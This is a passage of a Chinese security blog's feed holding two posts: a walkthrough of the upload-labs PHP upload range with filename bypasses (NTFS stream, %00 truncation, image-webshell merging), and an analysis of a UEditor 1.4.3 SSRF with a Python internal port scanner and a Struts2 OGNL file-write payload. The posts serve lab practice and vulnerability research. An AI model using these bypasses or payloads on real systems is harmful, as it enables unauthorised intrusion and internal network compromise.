    <content type="html"><![CDATA[<p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>是一个总结了大部分PHP上传漏洞的靶场 ，本文主要是记录一下这些常见上传漏洞的绕过方法。当然一种漏洞会有多种绕过的方法，这里暂时列举一些我所知道的解法。有些会有环境限制的，我会在其中备注出来的。</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我这里用到的是PHPStudy2016。采用的是Apache+php，其中Apache版本为2.4，php版本按照作者所说的为5.2.17。操作系统为Win10 。然后下载upload-labs并放置在PHPStudy安装目录的WWW目录下。也可以采用作者的<a href="https://github.com/c0ny1/upload-labs/releases" target="_blank" rel="noopener">集成环境</a>。</p><h2 id="题目与解法"><a href="#题目与解法" class="headerlink" title="题目与解法"></a>题目与解法</h2><p>首先需要在upload-labs目录下新建upload目录。</p><p>然后就开始答题了。其中13-16暂时要求的是“保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码 ”，我就暂时以13题为例，其余的暂时先不做。第18题暂未解出，所以暂时先省略。</p><p>其他题的WriteUp如下：</p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>在js中判断文件，直接上传拦截后修改为php文件</p><p><img src="01.png" alt="1527750911228"></p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p><img src="02.png" alt="1527751110894"></p><blockquote><p>注意需要带上<code>Content-Type: image/jpeg</code></p></blockquote><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>首先名字为<code>3.php:jpg</code></p><p><img src="03_01.png" alt="1527752035450"></p><p>会写入一个<code>3.php</code>的空文件</p><p>然后修改名字为<code>3.&lt;&lt;&lt;</code></p><p><img src="03_02.png" alt="1527752164570"></p><p>参考<a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">https://www.waitalone.cn/php-windows-upload.html</a></p><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>需要在apache httpd.conf进行配置。</p><p><code>AddType application/x-httpd-php .php .phtml</code></p><p>然后上传的文件名可以为<code>3.php.a</code>或者<code>3.phtml</code></p><p><img src="03_03.png" alt="1527832795973"></p><blockquote><p>这个解法是查看到作者给的集成环境中有这样的设置</p></blockquote><h4 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h4><p><img src="03-04.png" alt="1527836221197"></p><p>首先文件名为<code>3.php.::$DATA</code>会生成一个<code>3.php.</code>文件</p><p>再将文件名修改为<code>3.php&gt;</code></p><p><img src="03-05.png" alt="1527835503648"></p><blockquote><p>第二次的文件名还可以为<code>3.php&lt;</code> 、<code>3.php&gt;</code> 、<code>3.php\</code> 以及<code>3.php&quot;</code></p><p>3.php.文件直接删除不掉，可以在bash命令下删除</p></blockquote><h4 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h4><p>%aa url解码</p><p><img src="03-06.png" alt="1527839239501"></p><p>其他还有%b3、%b2等。。</p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>参考Pass-03的方法1、2、3、4</p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>参考Pass-03的方法1、2、3、4</p><p>没有对文件名进行小写转换，所以大小写混合或者大写可以绕过</p><p><img src="05-02.png" alt="1527840876449"></p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>参考Pass-03的方法1、2、3、4</p><p>这里没有去除空格，所以用“6.php ”即可绕过</p><p><img src="06-02.png" alt="1528077233962"></p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>参考Pass-03的方法1、2、3、4</p><p>没有删除结尾的“.”，所以用“7.php.”可以绕过</p><p><img src="07-01.png" alt="1528077415251"></p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>参考Pass-03的方法1、2、3、4</p><p>没有对字符串<code>::$DATA</code>进行操作，所以可以使用<code>8.php::$DATA</code>绕过</p><p><img src="08-01.png" alt="1527841099446"></p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>参考Pass-03的方法1、2、3、4</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>关键代码<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>当后缀名中出现黑名单列表中的内容时，就替换为空，所以可以用pphphp这样的后缀绕过。</p><p><img src="10-01.png" alt="1527833585243"></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>%00截断即可</p><p>需关闭magic_quotes_gpc</p><p><img src="11-01.png" alt="1527816997321"></p><blockquote><p>集成环境中有该设置：<code>magic_quotes_gpc = Off</code></p></blockquote><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>%00截断即可，需要url解码</p><p>需关闭magic_quotes_gpc</p><p><img src="12-01.png" alt="1527817083878"></p><blockquote><p>集成环境中有该设置：<code>magic_quotes_gpc = Off</code></p></blockquote><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>题目已经更新，要求“保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码 ”</p><p>这里就以png格式图片为例</p><p><code>copy xwz.png/b + 1.txt 1111.png</code></p><p>其中xwz.png为正常的png图片，1.txt内容为<code>&lt;?php echo &quot;pwn&quot;;?&gt;</code></p><p>查看上传后的结果</p><p><img src="13-01.png" alt="1528079960735"></p><p>当然也可以直接用hex工具打开图片，在最后追加php代码。</p><blockquote><p>14-16和该题要求类似，统一按该方法处理。步骤省略。</p></blockquote><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>参考Pass-03方法1</p><p>文件名为：“17.php:.jpg”,上传成功后会生成一个17.php空文件，将文件名改为“17.&lt;&lt;&lt;”后再次上传</p><p><img src="17-01.png" alt="1528080850165"></p><p><img src="17-02.png" alt="1528080900372"></p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>save_name修改为“upload-19.php.”即可</p><p><img src="19-01.png" alt="1528081520987"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里面比较通杀的方法是采用<code>aaa.php:jpg</code> 的方法生成一个<code>aaa.php</code>的空文件，然后使用<code>aaa.&lt;&lt;&lt;</code>再次写入文件内容。可以参考<a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">当php邂逅windows通用上传缺陷</a>这篇文章，里面介绍的很详细。</p><p>本文主要用到的绕过方式有：</p><ol><li><p>修改js绕过（或者上传图片格式后抓包修改）</p></li><li><p>利用文件名<code>aaa.php:jpg</code> 的方法生成一个<code>aaa.php</code>的空文件，然后使用<code>aaa.&lt;&lt;&lt;</code>再次写入文件内容</p></li><li><p>使用<code>3.php::$DATA</code> 绕过</p></li><li><p>文件名进行小写绕过</p></li><li><p>“abc.php.” 绕过</p></li><li><p>“abc.pphphp”绕过</p></li><li><p>%00截断绕过</p></li><li><p>URL解码绕过（参考Pass-03)方法4</p></li></ol><p>本文只是给了部分解题的答案，没有过多的描述思路。每道题的解法也不是那么单一固定的。其中Pass-03到Pass-09都可以利用Pass-03的四种方法。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p></li><li><p><a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">https://www.waitalone.cn/php-windows-upload.html</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/c0ny1/upload-labs&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;upload-labs&lt;/a&gt;是一个总结了大部分PHP上传漏洞的靶场 ，本文主要是记录一下这些常见上传漏洞的绕过方法。当然一种漏洞会有多种绕过的方法，这里暂时列举一些我所知道的解法。有些会有环境限制的，我会在其中备注出来的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Exploit" scheme="https://fuping.site/categories/Exploit/"/>
    
    
      <category term="PHP" scheme="https://fuping.site/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>UEditor SSRF漏洞(JSP版本)分析与复现</title>
    <link href="https://fuping.site/2018/05/25/UEditor-SSRF-In-JSP/"/>
    <id>https://fuping.site/2018/05/25/UEditor-SSRF-In-JSP/</id>
    <published>2018-05-25T00:37:15.000Z</published>
    <updated>2020-07-14T07:22:01.032Z</updated>
    
    <content type="html"><![CDATA[<p>前些时间测试的时候遇到了一个系统采用了UEditor编辑器，版本为1.4.3。已知该编辑器v1.4.3版本（jsp)存在SSRF漏洞，虽然是Bool型的SSRF，除了可以进行内网探测外，也可以根据web应用指纹信息，之后进行进一步的测试。</p><a id="more"></a><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>查看官方的<a href="http://ueditor.baidu.com/website/changelog.html" target="_blank" rel="noopener">更新日志</a>可以发现UEditor编辑器在版本1.4.3.1修复了SSRF漏洞。<img src="01.png" alt="01"></p><p>那版本1.4.3应该存在SSRF漏洞，本着能搜索就不动手的原则搜了一下，发现<code>wooyun-2015-0133125</code>中提到过这类的漏洞。但我这里是jsp版本的，里面提到jsp版本不一样，只好去分析一下漏洞产生的位置。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>那我们需要查看版本1.4.3与1.4.3.1有什么不同，从而找到存在问题的地方。该项目的代码托管在Github上，地址为：<a href="https://github.com/fex-team/ueditor/" target="_blank" rel="noopener">https://github.com/fex-team/ueditor/</a> 。</p><p>查看版本1.4.3.1下的<a href="https://github.com/fex-team/ueditor/tree/v1.4.3.1/jsp" target="_blank" rel="noopener">jsp代码</a>.</p><p><img src="02.png" alt="02"></p><p>可以发现在该版本有一次commit，commitId 为<code>a1820147cfc3fbe2960a7d99f8dfbe338c02f0b6</code>。根据字面意思应该是增加了修复SSRF的代码。</p><p>下载下来后对比一下v1.4.3.1和v1.4.3代码有什么不同(这里仅对比jsp下的代码)。</p><p><img src="03.png" alt="03"></p><p>发现在v1.4.3.1中修改了jsp/src/com/baidu/ueditor/hunter/ImageHunter.java的<code>validHost</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validHost</span> <span class="params">( String hostname )</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">InetAddress ip = InetAddress.getByName(hostname);<span class="comment">//根据主机名获取ip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ip.isSiteLocalAddress()) &#123;<span class="comment">//是否为地区本地地址</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !filters.contains( hostname );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增了对ip地址是否为内部地址的判断。而在v1.4.3中仅仅是做了是否为过滤的ip地址。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validHost</span> <span class="params">( String hostname )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !filters.contains( hostname );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSiteLocalAddress</code>方法作用是当IP地址是地区本地地址（SiteLocalAddress）时返回true，否则返回false。</p><blockquote><p>IPv4的地址本地地址分为三段：10.0.0.0 ~ 10.255.255.255、172.16.0.0 ~ 172.31.255.255、192.168.0.0 ~ 192.168.255.255。</p></blockquote><p>搜索后发现在<code>captureRemoteData</code>中调用了<code>validHost</code>方法。</p><p> <img src="04.png" alt="05"></p><p>根据代码可以分析：首先使用<code>validHost</code>对url进行判断，如果不合法，就提示“被阻止的远程主机”；当满足条件后会使用<code>validContentState</code>方法查看返回的状态是否为200，若不为200，则提示“远程连接出错”；进而对后缀、文件大小进行判断，都符合之后才进行图片的保存。如果url无法访问，则提示“抓取远程图片失败”。</p><p>所以可以根据返回的内容，来推断该url对应的主机是否可以访问。由于在版本v1.4.3中没有对请求的主机进行验证，从而造成了SSRF漏洞。</p><p>继续查看在<code>capture</code>方法中调用了<code>captureRemoteData</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> State <span class="title">capture</span> <span class="params">( String[] list )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">MultiState state = <span class="keyword">new</span> MultiState( <span class="keyword">true</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( String source : list ) &#123;</span><br><span class="line">state.addState( captureRemoteData( source ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> state;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>invoke</code>中调用了<code>capture</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> ( actionType == <span class="keyword">null</span> || !ActionMap.mapping.containsKey( actionType ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> BaseState( <span class="keyword">false</span>, AppInfo.INVALID_ACTION ).toJSONString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">State state = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> actionCode = ActionMap.getType( <span class="keyword">this</span>.actionType );</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ( actionCode ) &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> ActionMap.CATCH_IMAGE:</span><br><span class="line">conf = configManager.getConfig( actionCode );</span><br><span class="line">String[] list = <span class="keyword">this</span>.request.getParameterValues( (String)conf.get( <span class="string">"fieldName"</span> ) );</span><br><span class="line">state = <span class="keyword">new</span> ImageHunter( conf ).capture( list );</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> state.toJSONString();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当调用<code>capture</code>需要满足条件为<code>actionCode</code>为<code>ActionMap.CATCH_IMAGE</code>，在<code>ActionMap</code>中value为<code>ActionMap.CATCH_IMAGE对应的</code>key为<code>catchimage。所以</code>当<code>actionType</code>值为<code>catchimage</code>，即<code>action</code>参数对应为<code>catchimage</code>时，才可能触发SSRF漏洞。下面对漏洞进行验证。</p><h2 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h2><p>这里用的是v1.4.3 jsp版本，下载ueditor1_4_3-utf8-jsp.zip，之后进行配置（可以参考<a href="http://fex.baidu.com/ueditor/#server-jsp）。" target="_blank" rel="noopener">http://fex.baidu.com/ueditor/#server-jsp）。</a></p><p><img src="05.png" alt="04"></p><p>功能实现的入口文件是jsp/controller.jsp。由上述分析可知需要满足<code>action</code>参数为<code>catchimage</code>。</p><p>在<code>case ActionMap.CATCH_IMAGE</code>中下断点，然后进行调试。</p><p>访问链接<a href="http://localhost:8088/jsp/controller.jsp?action=catchimage" target="_blank" rel="noopener">http://localhost:8088/jsp/controller.jsp?action=catchimage</a></p><p><img src="06.png" alt="1527146004264"></p><p>继续运行发现list为空，然后就抛出了异常。</p><p>再次运行，查看list数据从何而来。</p><p><img src="07.png" alt="1527146184688"></p><p>可以看出list的数据从浏览器source[]参数而来。这里source[]需要后缀为图片格式，具体可以查看config.js中的<code>catcherAllowFiles</code>。</p><p>已知192.168.135.133开启了tomcat服务，且端口为8080。我们这里访问一张不存在的图片，例如用UUID生成一张图片的名称。</p><p>构造请求链接：<a href="http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png" target="_blank" rel="noopener">http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png</a></p><p><img src="08.png" alt="1527151024365"></p><p>当进入<code>validHost</code>方法时，由于被访问的主机地址不在过滤的范围，所以返回true。</p><blockquote><p>这里可以发现，仅仅对<code>127.0.0.1</code>、<code>localhost</code>和<code>img.baidu.com</code>进行了限制，当ip为本地地址时并没有限制，从而可以进行内网探测。</p></blockquote><p><img src="09.png" alt="1527151160299"></p><p>而该图片由于不存在，所以状态码为404，到此抓取图片过程结束，并返回结果。</p><p>这里可以根据页面返回的结果不同，来判断该地址对应的主机端口是否开放。可以总结为以下几点：</p><ol><li>如果抓取不存在的图片地址时，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519&quot;} ]}</code>，即state为“远程连接出错”。</li><li>如果成功抓取到图片，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;SUCCESS&quot;,&quot;size&quot;: &quot;5103&quot;,&quot;source&quot;: &quot;http://192.168.135.133:8080/tomcat.png&quot;,&quot;title&quot;: &quot;1527173588127099881.png&quot;,&quot;url&quot;: &quot;/ueditor/jsp/upload/image/20180524/1527173588127099881.png&quot;} ]}</code>，即state为“SUCCESS”。</li><li>如果主机无法访问，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25&quot;} ]}</code>，即state为“抓取远程图片失败”。</li></ol><blockquote><p>由于除了在config.js中的<code>catcherLocalDomain</code>配置了过滤的地址外，没有针对内部地址进行过滤，所以可以根据抓取远程图片返回结果的不同，来进行内网的探测。</p></blockquote><h2 id="0x04-代码实现"><a href="#0x04-代码实现" class="headerlink" title="0x04 代码实现"></a>0x04 代码实现</h2><p>由上述分析，根据返回包中的state进行判断，当state为<code>&quot;远程连接出错&quot;</code>或者为”SUCCESS”时表示该主机存在，且对应的端口为开放状态。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__Date__=<span class="string">"20180524"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.133</span></span><br><span class="line"><span class="string">python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.0/24</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Python version: 3.6.2</span></span><br><span class="line"><span class="string">requirements:IPy==0.83</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> IPy <span class="keyword">import</span> IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url,ip,port)</span>:</span></span><br><span class="line">url = <span class="string">'%s/jsp/controller.jsp?action=catchimage&amp;source[]=http://%s:%s/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png'</span> % (url,ip,port)</span><br><span class="line">res = requests.get(url)</span><br><span class="line">result = res.text</span><br><span class="line">result = result.replace(<span class="string">"list"</span>,<span class="string">"\"list\""</span>)</span><br><span class="line">res_json = json.loads(result)</span><br><span class="line">state = res_json[<span class="string">'list'</span>][<span class="number">0</span>][<span class="string">'state'</span>]</span><br><span class="line"><span class="keyword">if</span> state == <span class="string">'远程连接出错'</span> <span class="keyword">or</span> state == <span class="string">'SUCCESS'</span>:</span><br><span class="line">print(ip,port,<span class="string">'is Open'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url,ip)</span>:</span></span><br><span class="line"></span><br><span class="line">ips = IP(ip)</span><br><span class="line">ports = [<span class="number">80</span>,<span class="number">8080</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">check(url,i,port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">ip = sys.argv[<span class="number">2</span>]</span><br><span class="line">main(url,ip)</span><br></pre></td></tr></table></figure><blockquote><p>由于返回的结果为<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;...&quot;} ]}</code>并不能直接用json来解析，需要将list替换为”list”后才可以作为json来解析。当然也可以直接使用burp来测试。</p></blockquote><p>在实际测试中的测试结果如下：</p><p><img src="10.png" alt="1527148655823"></p><h2 id="0x05-综合利用"><a href="#0x05-综合利用" class="headerlink" title="0x05 综合利用"></a>0x05 综合利用</h2><p>对于这样的Bool型SSRF ，页面仅返回了状态，而没有更多别的信息，要想进一步利用，可以根据如下的思路：</p><p><code>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;查看结果</code></p><h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>首先进行内网探测，查看内网开放的主机和端口。这里以本地为例。</p><p>执行命令：</p><p><code>python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.155</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.135.155 80 is Open</span><br><span class="line"></span><br><span class="line">192.168.135.155 8080 is Open</span><br></pre></td></tr></table></figure><p>发现端口80 和 8080 开放，然后进行应用的识别。</p><h3 id="应用识别"><a href="#应用识别" class="headerlink" title="应用识别"></a>应用识别</h3><p>80端口由于没有可以识别的特征，所以未识别到应用的类型，而8080端口可以识别出来为tomcat服务器。</p><p><img src="11.png" alt="1527175485827"></p><p>然后尝试查看是否存在Struts2漏洞。</p><h3 id="攻击Payload"><a href="#攻击Payload" class="headerlink" title="攻击Payload"></a>攻击Payload</h3><p>由于在抓取远程图片时，会请求给出的URL地址，所以可以利用Struts2漏洞在内网服务器（这里为192.168.135.155）上写入一个后缀为图片格式（如png、jpg)的文件（因为只能抓取图片格式的文件，所以这里写入了图片后缀的文件），然后利用Ueditor抓取图片的功能，将写入的图片文件抓取到ueditor服务器中，然后访问图片查看攻击结果。</p><p>首先写文件，这里利用Struts2漏洞在内网服务器web项目下写入一个名字为b5e592d2-ab5b-476d-865a-8299a0625490.png的文件，内容为<code>Struts2_Test.png</code>。</p><p><img src="12.png" alt="1527181406261"></p><blockquote><p>这里之所以写入内容为<code>Struts2_Test.png</code>，是由于在抓取图片时会判断图片链接的后缀是否为图片格式。当然还有其他的写法，例如</p><p><a href="http://192.168.135.135:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action%3Fredirect%253A%24%257B%2523req%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%2523b%253D%2523req.getRealPath(%2522/%2522)%252B&#39;b5e592d2-ab5b-476d-865a-8299a0625490.png&#39;,%2523res%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%2523res.getWriter().print(%2522oko%2522),%2523res.getWriter().print(%2522kok%2522),%2523res.getWriter().flush(),%2523res.getWriter().close(),new%2520java.io.BufferedWriter(new%2520java.io.FileWriter(%2523b)).append(%2523req.getParameter(%2522shell%2522)).close()%257D%26shell%3DStruts2_Test&amp;aaa.png也可以写入。" target="_blank" rel="noopener">http://192.168.135.135:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action%3Fredirect%253A%24%257B%2523req%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%2523b%253D%2523req.getRealPath(%2522/%2522)%252B&#39;b5e592d2-ab5b-476d-865a-8299a0625490.png&#39;,%2523res%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%2523res.getWriter().print(%2522oko%2522),%2523res.getWriter().print(%2522kok%2522),%2523res.getWriter().flush(),%2523res.getWriter().close(),new%2520java.io.BufferedWriter(new%2520java.io.FileWriter(%2523b)).append(%2523req.getParameter(%2522shell%2522)).close()%257D%26shell%3DStruts2_Test&amp;aaa.png也可以写入。</a></p></blockquote><p>然后再次利用Ueditor抓取远程图片的功能将写入内网服务器的“图片文件”抓取下来，查看其内容。</p><p>这里需要抓取的图片地址为：<a href="http://192.168.135.155:8080/Struts2_bugs-0.0.1-SNAPSHOT/b5e592d2-ab5b-476d-865a-8299a0625490.png" target="_blank" rel="noopener">http://192.168.135.155:8080/Struts2_bugs-0.0.1-SNAPSHOT/b5e592d2-ab5b-476d-865a-8299a0625490.png</a></p><p><img src="13.png" alt="1527181487872"></p><p>由上图可以看出，最后抓取的文件保存地址为：<code>/ueditor/jsp/upload/image/20180525/1527181480175039672.png</code></p><h3 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h3><p>然后访问<a href="http://localhost:8088/ueditor/jsp/upload/image/20180525/1527181480175039672.png" target="_blank" rel="noopener">http://localhost:8088/ueditor/jsp/upload/image/20180525/1527181480175039672.png</a></p><p>查看是否攻击成功。</p><p><img src="14.png" alt="1527181545625"></p><p>表明攻击成功。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>由于UEditor在v1.4.3之前没有加入对内部IP的限制，所以在使用抓取图片的功能时，造成SSRF漏洞。可以进行内网服务器的探测。然后根据内网服务器的特征（如<code>/jmx-console/images/logo.gif</code>, <code>/tomcat.png）</code>，判断其使用的组件，并猜测可能存在的漏洞，然后进行进一步的渗透。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前些时间测试的时候遇到了一个系统采用了UEditor编辑器，版本为1.4.3。已知该编辑器v1.4.3版本（jsp)存在SSRF漏洞，虽然是Bool型的SSRF，除了可以进行内网探测外，也可以根据web应用指纹信息，之后进行进一步的测试。&lt;/p&gt;
    
    </summary>
    
    
